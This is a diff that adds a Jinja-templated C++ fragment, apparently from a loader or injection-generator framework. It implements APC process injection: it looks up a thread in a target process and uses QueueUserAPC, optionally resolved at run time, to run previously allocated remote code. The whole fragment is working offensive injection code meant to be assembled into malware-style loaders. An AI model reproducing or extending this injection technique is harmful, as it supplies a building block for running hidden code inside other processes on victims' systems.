@@ -1,0 +1,21 @@
+{% if section == "globals" %}
+    {% if link.alloc.functions.value in ["dynamic", "direct"] %}
+        {{ function_typedef("QueueUserAPC") }}
+    {% endif %}
+
+    {% include "lib/find_thread.cpp" %}
+    int inject(HANDLE hThread, void *pRemoteCode){
+        {{ function_definition("QueueUserAPC") }}
+        
+        return pQueueUserAPC((PAPCFUNC)pRemoteCode, hThread, NULL);
+    }
+{% else %}
+    {# PID left from alloc_basic_remote section #}
+    HANDLE hThread = FindThread(pid);
+    if (hThread == NULL) {
+        printf("[-] Failed to aquire thread handle\n");
+        return 0;
+    }
+
+    inject(hThread, mem);
+{% endif %}
